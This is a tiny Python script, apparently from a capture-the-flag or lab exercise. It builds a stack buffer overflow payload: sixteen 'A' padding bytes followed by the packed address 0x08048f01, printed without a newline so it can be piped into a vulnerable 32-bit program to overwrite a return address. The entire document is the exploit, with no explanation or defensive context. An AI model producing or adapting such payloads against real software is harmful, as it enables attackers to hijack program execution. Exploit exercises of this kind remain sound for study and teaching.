from __future__ import print_function
from struct import pack

addr = 0x08048f01

print("A"*16 + pack("<I", addr), end='')


